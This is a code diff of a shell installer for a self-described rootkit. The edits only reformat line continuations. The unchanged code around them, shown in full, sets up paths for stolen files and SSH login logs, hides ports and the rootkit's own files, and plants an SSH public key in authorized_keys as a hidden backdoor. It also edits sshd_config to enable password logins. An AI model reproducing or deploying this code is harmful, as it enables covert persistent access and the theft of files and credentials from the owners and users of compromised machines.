@@ -53,36 +53,36 @@ setup_home(){ # $1 = home/install directory
         [ "`toggle_enabled HIDE_SELF`" == "true" ] && hide_path $dest
     done
 
-    [ -f $homedir/.bashrc ] &&  { \
-        echo '. .bashrc' > "$homedir/.profile" && \
-        hide_path $homedir/.profile; \
+    [ -f $homedir/.bashrc ] &&  {
+        echo '. .bashrc' > "$homedir/.profile" &&
+        hide_path $homedir/.profile;
     }
 
-    [ "`toggle_enabled FILE_STEAL`" == "true" ] && { \
-        necho "Setting up path for stolen files" && \
-        setup_path $homedir 'dir' INTEREST_DIR; \
+    [ "`toggle_enabled FILE_STEAL`" == "true" ] && {
+        necho "Setting up path for stolen files" &&
+        setup_path $homedir 'dir' INTEREST_DIR;
     }
 
-    [ "`toggle_enabled LOG_SSH`" == "true" ] && { \
-        necho "Setting up path for ssh logs" && \
-        setup_path $homedir 'file' SSH_LOGS; \
+    [ "`toggle_enabled LOG_SSH`" == "true" ] && {
+        necho "Setting up path for ssh logs" &&
+        setup_path $homedir 'file' SSH_LOGS;
     }
 
-    [ "`toggle_enabled HIDE_PORTS`" == "true" ] && { \
-        necho "Setting up & writing 'hide_ports'" && \
-        setup_path $homedir 'file' HIDEPORTS && \
-        write_hideports $HIDEPORTS; \
+    [ "`toggle_enabled HIDE_PORTS`" == "true" ] && {
+        necho "Setting up & writing 'hide_ports'" &&
+        setup_path $homedir 'file' HIDEPORTS &&
+        write_hideports $HIDEPORTS;
     }
 
-    [ "`toggle_enabled HIDE_SELF`" == "true" ] && { \
-        necho "Hiding all rootkit files" && \
-        hide_rootkitfiles $homedir; \
+    [ "`toggle_enabled HIDE_SELF`" == "true" ] && {
+        necho "Hiding all rootkit files" &&
+        hide_rootkitfiles $homedir;
     }
 
-    [ -f './etc/id_rsa.pub' ] && { \
-        necho "Copying ./etc/id_rsa.pub to $homedir/.ssh/authorized_keys" && \
-        mkdir $homedir/.ssh && cp ./etc/id_rsa.pub $homedir/.ssh/authorized_keys && \
-        hide_path $homedir/.ssh/authorized_keys; \
+    [ -f './etc/id_rsa.pub' ] && {
+        necho "Copying ./etc/id_rsa.pub to $homedir/.ssh/authorized_keys" &&
+        mkdir $homedir/.ssh && cp ./etc/id_rsa.pub $homedir/.ssh/authorized_keys &&
+        hide_path $homedir/.ssh/authorized_keys;
     }
 }
 
@@ -95,10 +95,10 @@ patch_sshdconfig(){
     [ ! -f $sshd_config ] && return
 
     # enable PAM logins
-    [ "`cat $sshd_config | grep 'UsePAM'`" == 'UsePAM yes' ] || \
+    [ "`cat $sshd_config | grep 'UsePAM'`" == 'UsePAM yes' ] ||
         echo 'UsePAM yes' >> $sshd_config
 
-    # enable user password authentications
-    [ "`cat $sshd_config | grep 'PasswordAuthentication yes'`" == 'PasswordAuthentication yes' ] || \
+    # enable user password authentications.
+    [ "`cat $sshd_config | grep 'PasswordAuthentication yes'`" == 'PasswordAuthentication yes' ] ||
         echo 'PasswordAuthentication yes' >> $sshd_config
 }
